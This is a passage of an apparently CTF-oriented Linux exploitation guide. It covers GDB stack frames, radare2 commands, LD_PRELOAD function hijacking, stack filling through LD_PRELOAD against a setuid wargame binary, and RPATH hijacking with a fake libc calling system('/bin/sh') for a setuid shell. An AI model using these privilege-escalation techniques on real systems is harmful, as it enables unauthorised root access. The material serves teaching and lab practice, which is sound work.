<span class="n">ebp</span> <span class="n">at</span> <span class="mh">0xb75f7388</span><span class="p">,</span> <span class="n">eip</span> <span class="n">at</span> <span class="mh">0xb75f738c</span>
</pre></div>
</div>
<ul class="simple">
<li><p><strong>stack level 0</strong> : frame num in backtrace, 0 is current executing frame, which grows downwards, in consistence with the stack.</p></li>
<li><p><strong>frame at 0xb75f7390</strong> : starting memory address of this stack frame</p></li>
<li><p><strong>eip = 0x804877f in base::func() (testing.cpp:16); saved eip 0x804869a</strong> : eip is the register for next instruction to execute (also called program counter). so at this moment, the next to execute is at “0x804877f”, which is line 16 of testing.cpp.</p></li>
<li><p><strong>saved eip “0x804869a”</strong> is so called “return address”, i.e., the instruction to resume in caller stack frame after returning from this callee stack. It is pushed into stack upon “CALL” instruction (save it for return).</p></li>
<li><p><strong>called by frame at 0xb75f73b0</strong> : the address of the caller stack frame</p></li>
<li><p><strong>source language c++</strong> : which language in use</p></li>
<li><p><strong>Arglist at 0xb75f7388, args: this=0x0</strong> : the starting address of arguments</p></li>
<li><p><strong>Locals at 0xb75f7388</strong> : address of local variables.</p></li>
<li><p><strong>Previous frame’s sp is 0xb75f7390</strong> : this is where the previous frame´s stack pointer point to (the caller frame), at the moment of calling, it is also the starting memory address of called stack frame.</p></li>
<li><p><strong>Saved registers</strong> : These are the two addresses on the callee stack, for two saved registers.</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>ebp at 0xb75f7388 that is the address where the “ebp” register of the caller´s stack frame saved (please note, it is the register, not the caller´s stack address). i.e., corresponding to “PUSH %ebp”. “ebp” is the register usually considered as the starting address of the locals of this stack frame, which use “offset” to address. In another word, the operations of local variables all use this “ebp”, so you will see something like mov -0x4(%ebp), %eax, etc.</p></li>
<li><p>eip at 0xb75f738c as mentioned before, but here is the address of the stack (which contains the value “0x804877f”).</p></li>
</ul>
</div></blockquote>
</section>
<section id="examining-registers">
<h5>Examining Registers<a class="headerlink" href="#examining-registers" title="Link to this heading"></a></h5>
<p>We can refer to machine register contents, in expressions, as variables with names starting with ‘$’. The names of registers are different for each machine; use info registers to see the names used on your machine.</p>
<ul class="simple">
<li><p>info registers : Print the names and values of all registers except floating-point registers (in the selected stack frame).</p></li>
<li><p>info all-registers : Print the names and values of all registers, including floating-point registers.</p></li>
<li><p>info registers regname … : Print the relativized value of each specified register regname. As discussed in detail below, register values are normally relative to the selected stack frame. regname may be any register name valid on the machine you are using, with or without the initial ‘$’.</p></li>
</ul>
</section>
<section id="setting-program-variable">
<h5>Setting program variable<a class="headerlink" href="#setting-program-variable" title="Link to this heading"></a></h5>
<p>Either</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span> <span class="n">variable</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span>
</pre></div>
</div>
<p>or update arbitary (writable) location by address</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="p">{</span><span class="nb">int</span><span class="p">}</span><span class="mh">0x83040</span> <span class="o">=</span> <span class="mi">4</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="radare2-basics">
<h3>Radare2 Basics<a class="headerlink" href="#radare2-basics" title="Link to this heading"></a></h3>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>r2 -Ad ./crackme0x01 : Opens r2 in debug mode with the Analyze all flag active
afll : Lists all functions and their location in memory
s sym.main : Seeks to function sym.main. Address in prompt will change
pdf @ sym.main (which means something like “show me the main function without seek to it”) could be used.

pdf : &quot;Print Disassembling Function&quot;
iz : Shows the strings present in the data section. One can use izz to see the strings for the entire binary
db 0x12345678 : Sets a breakpoint at address 0x12345678. It&#39;s possible to set more than one breakpoint
dc : Runs the program until it hits a breakpoint
dr : Shows the content of all registers. Use dr &lt;register&gt; for a specific register
afvd : Shows the content of all local/args variables
pf Prints formatted data. Use pf?? to see available formats and pf??? for examples
? 0x10 Converts the number 0x10 to the most common bases
</pre></div>
</div>
</section>
<section id="appendix-ii-ld-preload">
<h3>Appendix-II LD_PRELOAD<a class="headerlink" href="#appendix-ii-ld-preload" title="Link to this heading"></a></h3>
<section id="hijacking-functions">
<h4>Hijacking Functions<a class="headerlink" href="#hijacking-functions" title="Link to this heading"></a></h4>
<p>Let’s say there’s a function getrand which generates a random path for the files to be stored</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">getrand</span><span class="p">(</span><span class="n">char</span> <span class="o">**</span><span class="n">path</span><span class="p">)</span>
<span class="p">{</span>
 <span class="n">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
 <span class="nb">int</span> <span class="n">pid</span><span class="p">;</span>
 <span class="nb">int</span> <span class="n">fd</span><span class="p">;</span>

 <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">NULL</span><span class="p">));</span>

 <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;TEMP&quot;</span><span class="p">);</span>
 <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>

 <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/</span><span class="si">%d</span><span class="s2">.</span><span class="si">%c%c%c%c%c%c</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
   <span class="s1">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
   <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="s1">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
   <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>

 <span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mi">0600</span><span class="p">);</span>
 <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
 <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>If we see the above function, getpid figures out the PID of the program, unlink deletes the file and random provides a random number.</p>
<p>We also need to check if the binary is dynamically linked or not?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">file</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">flagXX</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">flagXX</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">Intel</span> <span class="mi">80386</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span> <span class="p">(</span><span class="n">uses</span> <span class="n">shared</span> <span class="n">libs</span><span class="p">),</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6.15</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
</pre></div>
</div>
<p>If so, then we can create a c file to override the functions we want – random(), unlink() and getpid():</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hacking_randomfile</span><span class="o">.</span><span class="n">c</span>

<span class="o">//</span> <span class="n">Take</span> <span class="n">control</span> <span class="n">of</span> <span class="n">random</span>
<span class="nb">int</span> <span class="n">random</span><span class="p">(){</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="o">//</span> <span class="n">Stop</span> <span class="n">the</span> <span class="n">file</span> <span class="n">being</span> <span class="n">deleted</span>
<span class="nb">int</span> <span class="n">unlink</span><span class="p">(</span><span class="n">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="o">//</span> <span class="n">Take</span> <span class="n">control</span> <span class="n">of</span> <span class="n">the</span> <span class="n">reported</span> <span class="n">PID</span>
<span class="nb">int</span> <span class="n">getpid</span><span class="p">()</span> <span class="p">{</span>
   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Now, we need to compile this with</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="n">hacking_randomfile</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">hacking_randomfile</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">fPIC</span>
</pre></div>
</div>
<p>Using gcc we’ve specified the normal input file (hacking_randomfile.c) and output file (-o hacking_randomfile), but we’ve also specified two additional options:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">shared</span> <span class="n">to</span> <span class="n">make</span> <span class="n">a</span> <span class="n">library</span> <span class="ow">and</span>
<span class="o">-</span><span class="n">fPIC</span> <span class="n">to</span> <span class="n">specify</span> <span class="n">Position</span> <span class="n">Independent</span> <span class="n">Code</span><span class="p">,</span> <span class="n">which</span> <span class="ow">is</span> <span class="n">necessary</span> <span class="k">for</span> <span class="n">making</span> <span class="n">a</span> <span class="n">shared</span> <span class="n">library</span><span class="o">.</span>
</pre></div>
</div>
<p>Now that we’ve built hacking_randomfile as a shared library, here’s the basic usage:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ LD_PRELOAD=&quot;$PWD/hacking_randomtime&quot; ./main_targetfile
</pre></div>
</div>
<p>SANS has written a blog about <a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Go To The Head Of The Class: LD_PRELOAD For The Win</a></p>
<section id="important-things-to-note">
<h5>Important things to note<a class="headerlink" href="#important-things-to-note" title="Link to this heading"></a></h5>
<ul class="simple">
<li><p>Function definition should be correct</p></li>
<li><p>Funtion input and return type should also be correct.</p></li>
</ul>
</section>
</section>
<section id="controlling-uninitialized-memory-with-ld-preload">
<h4>Controlling uninitialized memory with LD_PRELOAD<a class="headerlink" href="#controlling-uninitialized-memory-with-ld-preload" title="Link to this heading"></a></h4>
<p>Dan Rosenberg has documented this technique at <a class="reference external" href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Controlling uninitialized memory with LD_PRELOAD</a> The below stuff is directly taken from the blog post.</p>
<p>A local Linux user can exercise a degree of control over uninitialized memory on the stack when executing a program. This happens because of the way the Linux linker/loader, ld.so, handles the LD_PRELOAD environment variable. This variable allows users to specify libraries to be preloaded, effectively allowing users to override functions used in a particular binary. However, regardless of whether or not libraries specified via LD_PRELOAD are actually loaded at runtime, ld.so copies the name of each library onto the stack prior to executing the program, and doesn’t clean up after itself. By specifying a very long LD_PRELOAD variable and executing a binary, a portion of the stack will be overwritten with part of the LD_PRELOAD variable during linking, and it will stay that way once execution of the program begins, even on setuid binaries, where the library itself is not loaded.</p>
<p>This means we can initialise the memory to something under out control:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ export LD_PRELOAD=`python -c &#39;print &quot;/bin/getflag\x0a&quot;*1000&#39;`
</pre></div>
</div>
<p>i.e. fill the stack with one thousand /bin/getflags.</p>
<p>Then when we run flagXX with length of 1, it will almost certainly have this in the buffer already:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ echo -ne &quot;Content-Length: 1\n &quot; | /home/flagXX/flagXX
sh: !getflag: command not found
getflag is executing on a non-flag account, this doesn&#39;t count
getflag is executing on a non-flag account, this doesn&#39;t count
getflag is executing on a non-flag account, this doesn&#39;t count
... lots of repeats ...
sh: line 74: /bin/getfl=qm: No such file or directory
</pre></div>
</div>
<p>Of course, the LD_PRELOAD variable is ignored with setuid binaries, since otherwise an attacker could trivially override arbitrary functions in setuid binaries and easily take control of a system.</p>
</section>
<section id="libc-rpath">
<h4>LIBC - Rpath<a class="headerlink" href="#libc-rpath" title="Link to this heading"></a></h4>
<p>If there’s exist a suid binary with a RPATH defined which we control, we can get code execution. Let’s first read what’s rpath?</p>
<section id="rpath">
<h5>RPATH<a class="headerlink" href="#rpath" title="Link to this heading"></a></h5>
<p><a class="reference external" href="https://en.wikipedia.org/wiki/Rpath">rpath</a> designates the run-time search path hard-coded in an executable file or library. Dynamic linking loaders use the rpath to find required libraries. Specifically it encodes a path to shared libraries into the header of an executable (or another shared library). This RPATH header value (so named in the Executable and Linkable Format header standards) may either override or supplement the system default dynamic linking search paths.</p>
<p>Libraries loaded from the run-time path defined by RPATH wont disable the setuid execution as LDPRELOAD would do. So we can inject our own libc.so.6 (Using version GLIBC2.0 as required by the binary) in the RPATH directory and hook any of the used functions to execute our setuid shell.</p>
<p>We can use readelf to check the dynamic section of a binary</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">readelf</span> <span class="o">-</span><span class="n">d</span> <span class="n">flagXX</span>

<span class="n">Dynamic</span> <span class="n">section</span> <span class="n">at</span> <span class="n">offset</span> <span class="mh">0xf20</span> <span class="n">contains</span> <span class="mi">21</span> <span class="n">entries</span><span class="p">:</span>
 <span class="n">Tag</span>        <span class="n">Type</span>                         <span class="n">Name</span><span class="o">/</span><span class="n">Value</span>
<span class="mh">0x00000001</span> <span class="p">(</span><span class="n">NEEDED</span><span class="p">)</span>                     <span class="n">Shared</span> <span class="n">library</span><span class="p">:</span> <span class="p">[</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span><span class="p">]</span>
<span class="mh">0x0000000f</span> <span class="p">(</span><span class="n">RPATH</span><span class="p">)</span>                      <span class="n">Library</span> <span class="n">rpath</span><span class="p">:</span> <span class="p">[</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="p">]</span>
<span class="mh">0x0000000c</span> <span class="p">(</span><span class="n">INIT</span><span class="p">)</span>                       <span class="mh">0x80482c0</span>
</pre></div>
</div>
<p>In the above example, we can see that RPATH is defined as /var/tmp/flagXX, so the binary tries to load the libc.so.6 from that location.</p>
<p>Let’s see what are the functions the binary utilizes from libc</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">objdump</span> <span class="o">-</span><span class="n">R</span> <span class="n">flagXX</span>

<span class="n">flagXX</span><span class="p">:</span>     <span class="n">file</span> <span class="nb">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">DYNAMIC</span> <span class="n">RELOCATION</span> <span class="n">RECORDS</span>
<span class="n">OFFSET</span>   <span class="n">TYPE</span>              <span class="n">VALUE</span>
<span class="mi">08049</span><span class="n">ff0</span> <span class="n">R_386_GLOB_DAT</span>    <span class="n">__gmon_start__</span>
<span class="mi">0804</span><span class="n">a000</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">puts</span>
<span class="mi">0804</span><span class="n">a004</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">__gmon_start__</span>
<span class="mi">0804</span><span class="n">a008</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">__libc_start_main</span>
</pre></div>
</div>
<p>If RPATH is writeable, we can possibly get a shell by creating a fake libc.so and defining fake __libc_start_main function with</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>to get a shell. We may also refer <a class="reference external" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up or - How the heck do we get to main()?</a> to understand what happens when we execute a linux binary (shared not static).</p>
</section>
<section id="libc-start-main">
<h5>libc_start_main<a class="headerlink" href="#libc-start-main" title="Link to this heading"></a></h5>
<p>From <a class="reference external" href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">linuxbase</a> The _libcstart_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">__libc_start_main</span><span class="p">(</span><span class="nb">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="n">void</span><span class="p">),</span> <span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="n">void</span><span class="p">),</span> <span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="n">void</span><span class="p">),</span> <span class="n">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">));</span>
</pre></div>
</div>
</section>
<section id="gmon-start">
<h5>gmon_start<a class="headerlink" href="#gmon-start" title="Link to this heading"></a></h5>
<p>The function call_gmon_start initializes the gmon profiling system. This system is enabled when binaries are compiled with the -pg flag, and creates output for use with gprof(1). In the case of the scenario binary call_gmon_start is situated directly proceeding that _start function. The call_gmon_start function finds the last entry in the Global Offset Table (also known as __gmon_start__) and, if not NULL, will pass control to the specified address. The __gmon_start__ element points to the gmon initialization function, which starts the recording of profiling information and registers a cleanup function with atexit(). In our case however gmon is not in use, and as such __gmon_start__ is NULL.</p>
</section>
<section id="version-reference">
<h5>Version Reference<a class="headerlink" href="#version-reference" title="Link to this heading"></a></h5>
<p>GLib provides version information, primarily useful in configure checks for builds that have a configure script.</p>
<p>Check glib version in binary</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">objdump</span> <span class="o">-</span><span class="n">p</span> <span class="n">flagXX</span>

<span class="n">flagXX</span><span class="p">:</span>     <span class="n">file</span> <span class="nb">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">Version</span> <span class="n">References</span><span class="p">:</span>
 <span class="n">required</span> <span class="kn">from</span> <span class="nn">libc.so.</span><span class="mi">6</span><span class="p">:</span>
   <span class="mh">0x0d696910</span> <span class="mh">0x00</span> <span class="mi">02</span> <span class="n">GLIBC_2</span><span class="mf">.0</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">objdump</span> <span class="o">-</span><span class="n">T</span> <span class="n">flagXX</span>

<span class="n">flagXX</span><span class="p">:</span>     <span class="n">file</span> <span class="nb">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">DYNAMIC</span> <span class="n">SYMBOL</span> <span class="n">TABLE</span><span class="p">:</span>
<span class="mi">00000000</span>      <span class="n">DF</span> <span class="o">*</span><span class="n">UND</span><span class="o">*</span> <span class="mi">00000000</span>  <span class="n">GLIBC_2</span><span class="mf">.0</span>   <span class="n">puts</span>
<span class="mi">00000000</span>  <span class="n">w</span>   <span class="n">D</span>  <span class="o">*</span><span class="n">UND</span><span class="o">*</span> <span class="mi">00000000</span>              <span class="n">__gmon_start__</span>
<span class="mi">00000000</span>      <span class="n">DF</span> <span class="o">*</span><span class="n">UND</span><span class="o">*</span> <span class="mi">00000000</span>  <span class="n">GLIBC_2</span><span class="mf">.0</span>   <span class="n">__libc_start_main</span>
<span class="mi">080484</span><span class="n">cc</span> <span class="n">g</span>    <span class="n">DO</span> <span class="o">.</span><span class="n">rodata</span>       <span class="mi">00000004</span>  <span class="n">Base</span>        <span class="n">_IO_stdin_used</span>
</pre></div>
</div>
<p>Check glib version in your linux machine</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ldd</span> <span class="o">--</span><span class="n">version</span>
<span class="n">ldd</span> <span class="p">(</span><span class="n">Debian</span> <span class="n">GLIBC</span> <span class="mf">2.26</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="mf">2.26</span>
</pre></div>
</div>
<p>If you get error like “no version information available”, create a file version.ld with the version required.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">version</span><span class="o">.</span><span class="n">ld</span>
<span class="n">GLIBC_2</span><span class="mf">.0</span> <span class="p">{</span>
<span class="p">};</span>
</pre></div>
</div>
<p>and link it while compiling</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">static</span><span class="o">-</span><span class="n">libgcc</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">Wl</span><span class="p">,</span><span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">script</span><span class="o">=</span><span class="n">version</span><span class="o">.</span><span class="n">ld</span><span class="p">,</span><span class="o">-</span><span class="n">Bstatic</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span>
</pre></div>
</div>
</section>
<section id="ld-debug-environment-variable">
<h5>LD_DEBUG environment variable<a class="headerlink" href="#ld-debug-environment-variable" title="Link to this heading"></a></h5>
<p>If the LD_DEBUG variable is set then the Linux dynamic linker will dump debug information which can be used to resolve most loading problems very quickly. To see the available options just run any program with the variable set to help, i.e.:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">LD_DEBUG</span><span class="o">=</span><span class="n">help</span> <span class="n">cat</span>
<span class="n">Valid</span> <span class="n">options</span> <span class="k">for</span> <span class="n">the</span> <span class="n">LD_DEBUG</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">are</span><span class="p">:</span>

 <span class="n">libs</span>        <span class="n">display</span> <span class="n">library</span> <span class="n">search</span> <span class="n">paths</span>
 <span class="n">reloc</span>       <span class="n">display</span> <span class="n">relocation</span> <span class="n">processing</span>
 <span class="n">files</span>       <span class="n">display</span> <span class="n">progress</span> <span class="k">for</span> <span class="nb">input</span> <span class="n">file</span>
 <span class="n">symbols</span>     <span class="n">display</span> <span class="n">symbol</span> <span class="n">table</span> <span class="n">processing</span>
 <span class="n">bindings</span>    <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="n">symbol</span> <span class="n">binding</span>
 <span class="n">versions</span>    <span class="n">display</span> <span class="n">version</span> <span class="n">dependencies</span>
 <span class="nb">all</span>         <span class="nb">all</span> <span class="n">previous</span> <span class="n">options</span> <span class="n">combined</span>
 <span class="n">statistics</span>  <span class="n">display</span> <span class="n">relocation</span> <span class="n">statistics</span>
 <span class="n">unused</span>      <span class="n">determined</span> <span class="n">unused</span> <span class="n">DSOs</span>
 <span class="n">help</span>        <span class="n">display</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
</pre></div>
</div>
<p>If you want to debug a binary</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">LD_DEBUG</span> <span class="nb">all</span> <span class="o">./</span><span class="n">flagXX</span>

<span class="n">D_DEBUG</span><span class="o">=</span><span class="nb">all</span> <span class="o">./</span><span class="n">flagXX</span>
     <span class="mi">4796</span><span class="p">:</span>
     <span class="mi">4796</span><span class="p">:</span>     <span class="n">file</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="p">[</span><span class="mi">0</span><span class="p">];</span>  <span class="n">needed</span> <span class="n">by</span> <span class="o">./</span><span class="n">flagXX</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span>
     <span class="mi">4796</span><span class="p">:</span>     <span class="n">find</span> <span class="n">library</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="n">searching</span>
     <span class="mi">4796</span><span class="p">:</span>      <span class="n">search</span> <span class="n">path</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">sse2</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">sse2</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">i686</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">sse2</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">sse2</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">sse2</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">sse2</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">i686</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">sse2</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">sse2</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">cmov</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span>            <span class="p">(</span><span class="n">RPATH</span> <span class="kn">from</span> <span class="nn">file</span> <span class="o">./</span><span class="n">flagXX</span><span class="p">)</span>
     <span class="mi">4796</span><span class="p">:</span>       <span class="n">trying</span> <span class="n">file</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">tls</span><span class="o">/</span><span class="n">i686</span><span class="o">/</span><span class="n">sse2</span><span class="o">/</span><span class="n">cmov</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span>
</pre></div>
</div>
</section>
</section>
<section id="ulimit">
<h4>ulimit<a class="headerlink" href="#ulimit" title="Link to this heading"></a></h4>
<p>ulimit
User limits - limit the use of system-wide resources.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Syntax</span>
